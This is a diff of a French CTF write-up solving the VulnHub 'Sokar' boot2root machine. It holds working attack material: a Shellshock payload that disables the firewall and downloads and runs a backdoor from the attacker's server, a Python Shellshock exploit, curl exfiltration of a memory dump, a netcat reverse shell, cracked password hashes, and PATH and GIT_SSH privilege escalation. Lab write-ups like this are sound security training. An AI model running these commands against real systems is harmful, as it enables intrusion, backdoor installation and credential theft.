@@ -3,18 +3,17 @@ title: Solution du CTF Sokar de VulnHub
 tags: [CTF, VulnHub]
 ---
 
-Après avoir solutionné différentes partie du *CySCA 2014*, j'ai choisi de faire un break en m'orientant vers une compétition qui était alors organisée par *VulnHub*. Ce challenge baptisé [Sokar](https://www.vulnhub.com/entry/sokar-1,113/) est un *boot2root*, c'est à dire qu'il faut parvenir à obtenir les droits root sur la machine pour attraper le flag.  
+Après avoir résolu différentes partie du *CySCA 2014*, j'ai choisi de faire un break en m'orientant vers une compétition qui était alors organisée par *VulnHub*. Ce challenge baptisé [Sokar](https://www.vulnhub.com/entry/sokar-1,113/) est un *boot2root*, c'est-à-dire qu'il faut parvenir à obtenir les droits root sur la machine pour attraper le flag.  
 
-Kansas City Shuffle (la version courte)
----------------------------------------
+## Kansas City Shuffle (la version courte)
 
-Quand vous résolvez en une journée un CTF présenté comme une compétition difficile qui s'étend sur une période de 3 semaines c'est généralement que vous avez fait un [Kansas City Shuffle](https://www.youtube.com/watch?v=ag31JHU8LPU).  
+Quand vous résolvez en une journée un CTF présenté comme une compétition difficile qui s'étend sur une période de 3 semaines, c'est généralement que vous avez fait un [Kansas City Shuffle](https://www.youtube.com/watch?v=ag31JHU8LPU).  
 
-Ce n'était de toute évidence pas la façon dont les organisateurs pensaient que ce serait résolu du coup j'ai redonné une chance plus tard à *Sokar* pour suivre le vrai cheminement qui est plus intéressant mais commençons d'abord par cette solution rapide.  
+Ce n'était de toute évidence pas la façon dont les organisateurs pensaient que ce serait résolu du coup j'ai redonné une chance plus tard à *Sokar* pour suivre le vrai cheminement qui est plus intéressant, mais commençons d'abord par cette solution rapide.  
 
 Un scan Nmap rapide ne dévoile aucun port ouvert (le scan rapide ne teste que les ports les plus utilisés), tous les ports testés sont derrière un firewall :  
 
-```
+```console
 # nmap -T4 192.168.1.63
 
 Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-17 22:15 CET
@@ -32,31 +31,31 @@ Quand la VM se lance on observe un *DHCP Discover* partant de la VM tournant sur
 
 ![Sokar CTF - DHCP Discover](/assets/img/sokar/capt1.png)
 
-On remarque aussi qu'une fois que la machine a obtenu un bail DHCP elle fait des requêtes DNS concernant *sokar* en utilisant le serveur DNS de *Google* (8.8.8.8).  
+On remarque aussi qu'une fois que la machine a obtenu un bail DHCP elle fait des requêtes DNS concernant `sokar` en utilisant le serveur DNS de *Google* (8.8.8.8).  
 
-Peut-être que des connexions intéressantes sont faites à destination de *Sokar* donc essayons de les intercepter.  
+Peut-être que des connexions intéressantes sont faites à destination de `Sokar` donc essayons de les intercepter.  
 
 D'abord on va activer le routage sur notre machine :  
 
-```
+```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 Ensuite le traffic DNS qui passe par notre machine nous sera redirigé :  
 
-```
+```bash
 iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
 ```
 
 Tant qu'à faire, si on envoie des réponses autant qu'elles semblent provenir du serveur de destination initiale :  
 
-```
+```bash
 iptables -t nat -A POSTROUTING -j MASQUERADE
 ```
 
 Vous devriez obtenir un état comme celui-ci :  
 
-```
+```console
 # iptables -L -t nat
 Chain PREROUTING (policy ACCEPT)
 target     prot opt source               destination         
@@ -73,7 +72,7 @@ target     prot opt source               destination
 MASQUERADE  all  --  anywhere             anywhere
 ```
 
-Maintenant on va utiliser *Metasploit* pour lancer un serveur DHCP paramêtré à notre avantage (car nous déclarant comme le routeur).  
+Maintenant on va utiliser *Metasploit* pour lancer un serveur DHCP parametric à notre avantage (car nous déclarant comme le routeur).  
 
 ```
 msf > use auxiliary/server/dhcp
@@ -93,7 +92,7 @@ msf auxiliary(dhcp) >
 [*] Starting DHCP server...
 ```
 
-On laisse le serveur DHCP en tache de fond et on lance un faux serveur DNS qui répondra par notre adresse pour le nom *sokar* :  
+On laisse le serveur DHCP en tache de fond et on lance un faux serveur DNS qui répondra par notre adresse pour le nom `sokar` :  
 
 ```
 msf auxiliary(dhcp) > back
@@ -133,7 +132,7 @@ Tout se passe bien comme prévu... sauf qu'il n'y a pas de cocktail surprise :( 
 
 ![Sokar - DNS hijack](/assets/img/sokar/capt2.png)
 
-Puisqu'un client DHCP tourne sur la machine j'ai choisi de m'orienter vers la faille [Shellshock](http://d4n3ws.polux-hosting.com/2014/09/24/vulnerabilite-dans-bash/) qui concerne aussi DHCP.  
+Puisqu'un client DHCP tourne sur la machine, j'ai choisi de m'orienter vers la faille [Shellshock](http://d4n3ws.polux-hosting.com/2014/09/24/vulnerabilite-dans-bash/) qui concerne aussi DHCP.  
 
 Après avoir mis fin au faux serveur DHCP je configure le module *Metasploit* qui nous intéresse :  
 
@@ -155,25 +154,25 @@ msf exploit(bash_environment) > set CMD "iptables -F; wget http://192.168.1.3:80
 CMD => iptables -F; wget http://192.168.1.3:8000/tshd -O /tmp/tshd;chmod 755 /tmp/tshd;setsid /tmp/tshd
 ```
 
-Ici le payload consiste d'abord à supprimer les règles du pare-feu qui nous embêtent puis à lancer un serveur *tshd*.  
+Ici le payload consiste d'abord à supprimer les règles du pare-feu qui nous embêtent puis à lancer un serveur `tshd`.  
 
-On aura préalablement mit en place un mini serveur HTTP pour que la victime récupère la backdoor.  
+On aura préalablement mis en place un mini serveur HTTP pour que la victime récupère la backdoor.  
 
 Et devinez qui vient diner ce soir ?  
 
-```
-python -m SimpleHTTPServer
+```console
+$ python -m SimpleHTTPServer
 Serving HTTP on 0.0.0.0 port 8000 ...
 192.168.1.63 - - [17/Feb/2015 22:43:03] "GET /tshd HTTP/1.0" 200 -
 ```
 
-Il faut attendre un peu avoir de pouvoir profiter de l'attaque car comme on le voit dans la capture réseau l'exécution se fait via une tache cron :  
+Il faut attendre un peu avoir de pouvoir profiter de l'attaque, car comme on le voit dans la capture réseau l'exécution se fait via une tache cron :  
 
 ![Sokar shellshocked via DHCP](/assets/img/sokar/capt3.png)
 
 Facile... mais sans grands intérêts.  
 
-```
+```console
 $ ./tsh 192.168.1.63
 sh-4.1# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -208,7 +207,7 @@ sh-4.1# cat flag
 =====================================
 ```
 
-Au passage dans /root on trouve le code C suivant qui va vous permettre de mieux comprendre l'autre solution :  
+Au passage dans `/root` on trouve le code C suivant qui va vous permettre de mieux comprendre l'autre solution :  
 
 ```c
 #include <stdio.h>
@@ -248,14 +247,13 @@ int main (int argc, char *argv[]) {
 }
 ```
 
-Regular hellflip (plus c'est long, plus c'est bon)
---------------------------------------------------
+## Regular hellflip (plus c'est long, plus c'est bon)
 
-On est pas des manches, on se relève les manches !  
+On n'est pas des manches, on se relève les manches !  
 
 Un scan plus complet nous révèle l’existence d'un port TCP :  
 
-```
+```console
 $ sudo nmap -p1-65535 -T4 192.168.1.63
 
 Starting Nmap 6.40 ( http://nmap.org ) at 2015-02-23 11:48 CET
@@ -269,9 +267,9 @@ MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems)
 Nmap done: 1 IP address (1 host up) scanned in 584.82 seconds
 ```
 
-Pas grand chose à voir sur le site mis à part la présence d'un CGI en iframe :  
+Pas grand-chose à voir sur le site mis à part la présence d'un CGI en iframe :  
 
-```
+```console
 $ curl -I http://192.168.1.63:591/
 HTTP/1.1 200 OK
 Date: Mon, 23 Feb 2015 12:50:25 GMT
@@ -304,7 +302,7 @@ La page du CGI affiche une série de lignes qui proviennent de toute évidence d
 
 CGI ? Et si on retentait notre chance avec *Shellshock* (c'est à la mode), cette fois en mode web :  
 
-```
+```console
 $ ./bin/wapiti http://192.168.1.63:591/ -m shellshock
 Wapiti-2.3.0 (wapiti.sourceforge.net)
 
@@ -324,15 +322,15 @@ Un rapport a été généré dans le fichier /home/devloop/.wapiti/generated_rep
 Ouvrez /home/devloop/.wapiti/generated_report/index.html dans un navigateur pour voir ce rapport.
 ```
 
-[Le module Shellshock que j'ai écrit pour Wapiti](http://devloop.users.sourceforge.net/index.php?article109/wapiti-modules-shellshock-et-buster) (version de dév dispo via SVN) a trouvé une faille.  
+[Le module Shellshock que j'ai écrit pour Wapiti]({% link _posts/2014-09-28-Wapiti-modules-Shellshock-et-Buster.md %}) (version de dév dispo via SVN) a trouvé une faille.  
 
-En jouant un peu avec la vulnérabilité on remarque que la variable d'environnement *PATH* est très importante dans l'exploitation. Par exemple si on lance *which wget* en ayant spécifié le chemin complet de *which* :  
+En jouant un peu avec la vulnérabilité, on remarque que la variable d'environnement *PATH* est très importante dans l'exploitation. Par exemple si on lance `which wget` en ayant spécifié le chemin complet de `which` :  
 
 ```
 /usr/bin/which: no wget in ((null))
 ```
 
-Partant là dessus j'ai écrit l'exploit suivant :  
+Partant là-dessus j'ai écrit l'exploit suivant :  
 
 ```python
 import requests
@@ -351,12 +349,12 @@ while True:
     print r.content
 ```
 
-J'ai privilégié cette technique car contrairement à la solution précédente on ne peut pas se débarrasser facilement du firewall qui bloque aussi le trafic sortant (quoique l'on verra plus tard ;-) )  
+J'ai privilégié cette technique, car contrairement à la solution précédente, on ne peut pas se débarrasser facilement du firewall qui bloque aussi le trafic sortant (quoique l'on verra plus tard ;-) )  
 
-L'exploit permet d'avoir une simili invite de commande et s'utilise de cette façon :  
+L'exploit permet d'avoir une simili-invite de commande et s'utilise de cette façon :  
 
-```
-python xploit.py http://192.168.1.63:591/cgi-bin/cat
+```console
+$ python xploit.py http://192.168.1.63:591/cgi-bin/cat
 
 $ ls -alR /home
 
@@ -379,9 +377,9 @@ drwxr-xr-x. 4 root   root    4096 Dec 30 19:20 ..
 -rw-------  1 root   root   10728 Nov 13 11:45 lime.ko
 ```
 
-L'utilisateur *bynarr* n'est pas très regardant quand aux droits d'accès sur son répertoire personnel.  
+L'utilisateur `bynarr` n'est pas très regardant quant aux droits d'accès sur son répertoire personnel.  
 
-```
+```console
 $ find / -user apophis
 
 /mnt
@@ -403,11 +401,11 @@ $ id bynarr
 uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
 ```
 
-Intéressant, *bynarr* a un module kernel (qu'on ne peut pas lire) dans son home et est membre d'un groupe baptisé *forensic* (on devine à quoi on va toucher plus tard).  
+Intéressant, `bynarr` a un module kernel (qu'on ne peut pas lire) dans son home et est membre d'un groupe baptisé `forensic` (on devine à quoi on va toucher plus tard).  
 
-Dans le fichier *stats* appartenant à l'utilisateur on trouve l'output des commandes utilisées par le CGI :  
+Dans le fichier `stats` appartenant à l'utilisateur, on trouve l'output des commandes utilisées par le CGI :  
 
-```
+```console
 $ cat /tmp/stats
 
 Active Internet connections (servers and established)
@@ -438,11 +436,11 @@ sda               0.95        10.44         5.98     142210      81368
 sdb               0.03         0.20         0.00       2700          0
 ```
 
-A la fin du fichier on trouve ce qui semble être l'output de la commande *iostat*.  
+À la fin du fichier, on trouve ce qui semble être l'output de la commande `iostat`.  
 
-Que se passe t-il si on place le programme *mount* à l'emplacement */home/bynarr/iostat* (on fait la supposition que *iostat* n'est pas appelé via son chemin absolu) ?  
+Que se passe-t-il si on place le programme `mount` à l'emplacement `/home/bynarr/iostat` (on fait la supposition que `iostat` n'est pas appelé via son chemin absolu) ?  
 
-```
+```console
 $ cat /tmp/stats
 
 Active Internet connections (servers and established)
@@ -474,11 +472,11 @@ tmpfs on /dev/shm type tmpfs (rw)
 none on /proc/sys/fs/binfmt_misc type binfmt_misc (rw)
 ```
 
-Bingo ! Nos commandes sont bien exécutées en tant que *bynarr* via un mécanisme de tache planifiée.  
+Bingo ! Nos commandes sont bien exécutées en tant que `bynarr` via un mécanisme de tache planifiée.  
 
 Voyons si on peut aller plus loin :  
 
-```
+```console
 $ echo "#!/bin/bash" > /tmp/attack
 $ echo "chmod o+r /var/spool/mail/bynarr" >> /tmp/attack
 $ echo "sudo -l" >> /tmp/attack
@@ -501,9 +499,9 @@ User bynarr may run the following commands on this host:
     (ALL) NOPASSWD: /home/bynarr/lime
 ```
 
-On est autorisés à lancer le script */home/bynarr/lime* avec les droits de l'utilisateur root.  
+On est autorisés à lancer le script `/home/bynarr/lime` avec les droits de l'utilisateur root.  
 
-Evidemment ce script n'est pas écrasable (faut pas rêver).  
+Évidemment ce script n'est pas écrasable (il ne faut pas rêver).  
 
 Il s'avère que [LiME](http://d4n3ws.polux-hosting.com/2012/04/20/lime-un-lkm-pour-dumper-la-ram-sous-linux/) est un module kernel permettant de dumper la mémoire vive.  
 
@@ -538,15 +536,15 @@ fi
 
 Il faut parvenir à le faire exécuter en sachant qu'il lit l'action choisie sur l'entrée standard :  
 
-```
+```console
 $ echo "#!/bin/bash" > /tmp/attack
 $ echo 'if [ ! -f /tmp/ram ]; then echo add | sudo /home/bynarr/lime; fi' >> /tmp/attack
 $ cp /tmp/attack /home/bynarr/iostat
 ```
 
-On voit le fichier */tmp/ram* apparaître et grossir pour atteindre sa taille définitive :  
+On voit le fichier `/tmp/ram` apparaître et grossir pour atteindre sa taille définitive :  
 
-```
+```console
 $ ls -lh /tmp/ram
 
 -r--r--r-- 1 root root 256M Feb 23 15:04 /tmp/ram
@@ -554,7 +552,7 @@ $ ls -lh /tmp/ram
 
 Après avoir compressé le dump réduit à 40Mo on peut le récupérer assez facilement en exploitant shellshock directement via curl :  
 
-```
+```bash
 curl -A '() { :;}; echo; echo; /usr/bin/base64 /tmp/ram.tar.bz2;' http://192.168.1.63:591/cgi-bin/cat > out
 ```
 
@@ -564,14 +562,14 @@ Dans le dump on trouve notamment l'entrée crontab qui explique la faille :
 Feb 23 13:48:01 sokar CROND[4167]: (bynarr) CMD (/bin/bash -l -c 'source ~/.bash_profile; /bin/netstat -an 2>&1 > /tmp/stats; printf "\n" >> /tmp/stats; iostat 2>&1 >> /tmp/stats' > /dev/null)
 ```
 
-Et en cherchant les caractères *$6$* on trouve deux hashs :  
+Et en cherchant les caractères `$6$` on trouve deux hashs :  
 
 ```
 $6$ZEMP4rDiYsxlJz4h$boaXcV1Jn5o7VVI0REPHzSFUfYYjugTKez9SuMAGj68dhiUsNEJWBcM19mHMfqm6L422ePhAnRj.irCccHtPU1:::::::
 $6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4/mhZ3qnVrM/:::::::
 ```
 
-Via *John The Ripper* j'ai pu en casser un qui s'avère appartenir... à *bynarr* (U m4d br0?)  
+Via *John The Ripper* j'ai pu en casser un qui s'avère appartenir... à `bynarr` (U m4d br0?)  
 
 ```
 bynarr:fruity:::::::
@@ -579,23 +577,21 @@ bynarr:fruity:::::::
 
 Au passage je note que le fichier /etc/resolv.conf est world-writable :  
 
-```
+```console
 $ find /etc -writable
-
 /etc/resolv.conf
 
 $ cat /etc/resolv.conf
-
 nameserver 8.8.8.8
 ```
 
-Petite aparté pour vous indiquer que j'ai essayé d'utiliser *Volatility* pour analyser le dump ram en suivant la procédure de compilation basée sur *dwarfdump* qui est quasi incompilable et qui nécessite de disposer des sources / entêtes du kernel et tout le tralala....  
+Petit aparté pour vous indiquer que j'ai essayé d'utiliser *Volatility* pour analyser le dump ram en suivant la procédure de compilation basée sur `dwarfdump` qui est quasi incompilable et qui nécessite de disposer des sources / entêtes du kernel et tout le tralala....  
 
-Le masochisme à ses limites... PLUS JAMAIS ! JAMAIS ! *\*rire maniaque avec les orbites vides\**  
+Le masochisme à ses limites... PLUS JAMAIS ! JAMAIS ! **rire maniaque avec les orbites vides**  
 
-Du coup j'ai plutôt choisi de provoquer le chargement en mémoire du */etc/shadow* en appelant sudo de cette façon avant de décharger / recharger le module *LiME* :  
+Du coup j'ai plutôt choisi de provoquer le chargement en mémoire du `/etc/shadow` en appelant sudo de cette façon avant de décharger / recharger le module *LiME* :  
 
-```
+```bash
 echo test | sudo -S -u apophis id
 ```
 
@@ -607,7 +603,7 @@ bynarr:$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wm
 apophis:$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
 ```
 
-Le mot de passe d'apophis (*overdrive*) se casse facilement avec la wordlist de RockYou.  
+Le mot de passe d'`apophis` (`overdrive`) se casse facilement avec la wordlist de RockYou.  
 
 Pour m'aider dans mes aventures Sokariennes j'ai écrit le programme suivant permettant d'uploader un fichier via Shellshock :  
 
@@ -637,7 +633,7 @@ do_cmd("base64 -d /tmp/temp_data.txt > /tmp/out")
 fd.close()
 ```
 
-Et j'ai aussi écrit un script Python qui lance des commandes en tant que apophis via su dans un pseudo-terminal :  
+Et j'ai aussi écrit un script Python qui lance des commandes en tant que `apophis` via su dans un pseudo-terminal :  
 
 ```python
 import pty
@@ -660,7 +656,7 @@ else:
 
 Et le miracle s'accomplit :  
 
-```
+```console
 $ python /tmp/do_su.py ls -alR /home/apophis
 
 /home/apophis:
@@ -677,11 +673,11 @@ END
 
 Next-step : le binaire build qui est setuid root :)  
 
-Après avoir modifié les droits d'accès sur le home d'apophis (de ?) j'ai récupéré le binaire *build* via la même technique que pour le dump mémoire.  
+Après avoir modifié les droits d'accès sur le home d'apophis (de ?) j'ai récupéré le binaire `build` via la même technique que pour le dump mémoire.  
 
-Le binaire correspond au fait au code C vu sur la première solution. Ce dernier utilise la fonction *gets()* bien connue pour être dangereuse mais la randomisation de la pile, le fait que l'on est sur un système 64bits et la présence de canaries sur la pile rendent l'exploitation impraticable... Il faut voir ailleurs.  
+Le binaire correspond au fait au code C vu sur la première solution. Ce dernier utilise la fonction `gets()` bien connue pour être dangereuse, mais la randomisation de la pile, le fait que l'on est sur un système 64bits et la présence de canaries sur la pile rendent l'exploitation impraticable... Il faut voir ailleurs.  
 
-```
+```console
 $ ltrace -s 256 ./build 
 __libc_start_main([ "./build" ] <unfinished ...>
 __printf_chk(1, 0x7fe39e1ebb6c, 0x7fff43049ef8, 0) = 13
@@ -697,20 +693,20 @@ __cxa_finalize(0x7fe39e3ebc78, 0, 3, 1) = 0x7fe39dfc4070
 +++ exited (status 0) +++
 ```
 
-Et ailleurs c'est visiblement git car c'est ce qu'il se cache derrière la chaîne C que l'on avait vu sous forme obfusquée.  
+Et ailleurs, c'est visiblement git, car c'est ce qu'il se cache derrière la chaîne C que l'on avait vu sous forme obfusquée.  
 
 Entre temps, un éclair de lucidité (ou de génie, n'ayons pas peur des mots :D ) m'a poussé à utiliser IPv6 pour passer le firewall.  
 
-*Netcat* est installé sur la machine mais la version ne dispose pas de l'option -e, il faut donc créer un tube nommé (une fifo selon *William Shakespeare*) :  
+*Netcat* est installé sur la machine, mais la version ne dispose pas de l'option `-e`, il faut donc créer un tube nommé (une _fifo_ selon *William Shakespeare*) :  
 
-```
+```bash
 mkfifo /tmp/f
 cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc -6 fe80::ca60:ff:fec9:52af%eth0 9999 >/tmp/f
 ```
 
-Et côté attaquant on lance nonchalamment *ncat*, le couteau suisse du 21ème siècle :  
+Et côté attaquant on lance nonchalamment *ncat*, le couteau suisse du 21ᵉ siècle :  
 
-```
+```console
 $ ncat -6 -l -v 9999
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Listening on :::9999
@@ -738,7 +734,7 @@ uid=501(apophis) gid=502(apophis) groups=502(apophis)
 
 Déjà on a un shell qui sans être extra est plus réaliste :)  
 
-Comme la commande *git clone* cherche à contacter un serveur baptisé *sokar-dev* on va profiter de l'accès en écriture à *resolv.conf* pour nous définir comme serveur DNS :  
+Comme la commande `git clone` cherche à contacter un serveur baptisé `sokar-dev` on va profiter de l'accès en écriture à `resolv.conf` pour nous définir comme serveur DNS :  
 
 ```
 nameserver fe80::ca60:ff:fec9:52af
@@ -747,9 +743,9 @@ nameserver 192.168.0.3
 
 J'ai remarqué que pour que la résolution fonctionne il faut mettre une adresse IPv6 ET une adresse IPv4...  
 
-Et enfin via *dnschef* on répond à chaque requête DNS avec notre adresse IP (ici seuls les enregistrements A et AAAA nous intéressent).  
+Et enfin via `dnschef` on répond à chaque requête DNS avec notre adresse IP (ici seuls les enregistrements A et AAAA nous intéressent).  
 
-```
+```console
 # python dnschef.py -6 -i ::0  --fakeip 192.168.1.3 --fakeipv6 fe80::ca60:ff:fec9:52af --logfile=blah
           _                _          __  
          | | version 0.3  | |        / _| 
@@ -770,16 +766,16 @@ Et enfin via *dnschef* on répond à chaque requête DNS avec notre adresse IP (
 
 La résolution fonctionne, encore faut-il pouvoir faire quelque chose d'intéressant avec le dépôt git que l'on aura préalablement créé.  
 
-Les permissions setuid sur les fichiers sont droppées lors du git-clone et l'info sur le propriétaire initial aussi, sans doute à cause des options de montage de */mnt*.  
+Les permissions setuid sur les fichiers sont droppées lors du git-clone et l'info sur le propriétaire initial aussi, sans doute à cause des options de montage de `/mnt`.  
 
-En fouillant dans la page de manuel de *git* et *git-clone* j'ai relevé des variables d'environnement potentiellement attaquables : *GIT\_TEMPLATE\_DIR*, *GIT\_EXEC\_PATH*, *GIT\_SSH* et *GIT\_ASKPASS*.  
+En fouillant dans la page de manuel de `git` et `git-clone` j'ai relevé des variables d'environnement potentiellement attaquables : `GIT_TEMPLATE_DIR`, `GIT_EXEC_PATH`, `GIT_SSH` et `GIT_ASKPASS`.  
 
-L'idée derrière *GIT\_EXEC\_PATH* était de faire une copie de */usr/lib/git/* et de mettre un faux *git-clone* dans la copie du dossier... Sans résultat.
-La variable *GIT\_ASKPASS* permet de spécifier une commande qui aurait du se lancer lors de la saisie des identifiants SSH... mais ça n'a pas marché non plus.  
+L'idée derrière `GIT_EXEC_PATH` était de faire une copie de `/usr/lib/git/` et de mettre un faux `git-clone` dans la copie du dossier... Sans résultat.
+La variable `GIT_ASKPASS` permet de spécifier une commande qui aurait dû se lancer lors de la saisie des identifiants SSH... mais ça n'a pas marché non plus.  
 
-En revanche avec *GIT\_SSH* on parvient à exécuter nos commandes (notre script ne doit pas générer d'output car git le lance via un pipe et analyse la sortie). Autre avantage : la commande s'exécute même si on n'a pas créé de dépôt auparavant.  
+En revanche avec `GIT_SSH` on parvient à exécuter nos commandes (notre script ne doit pas générer d'output, car git le lance via un pipe et analyse la sortie). Autre avantage : la commande s'exécute même si on n'a pas créé de dépôt auparavant.  
 
-```
+```console
 [apophis@sokar ~]$ echo '#!/bin/bash' > cmd
 [apophis@sokar ~]$ echo 'cp /root/flag* /tmp' >> cmd
 [apophis@sokar ~]$ echo 'chmod 777 /tmp/flag*' >> cmd
@@ -821,11 +817,11 @@ cat /tmp/flag
 =====================================
 ```
 
-L'autre solution sans doute plus propre et de définir un hook Git qui concerne la commande clone, en particulier *post-checkout*.  
+L'autre solution sans doute plus propre et de définir un hook Git qui concerne la commande clone, en particulier `post-checkout`.  
 
 Comme on n'a pas d'accès pour écrire directement dans les hooks on fait une copie du dossier et on spécifie le chemin en environnement :  
 
-```
+```console
 [apophis@sokar ~]$ cp -r /usr/share/git-core/templates/ mytemplates
 [apophis@sokar ~]$ cd mytemplates/hooks
 [apophis@sokar hooks]$ echo '#!/bin/bash' > post-checkout
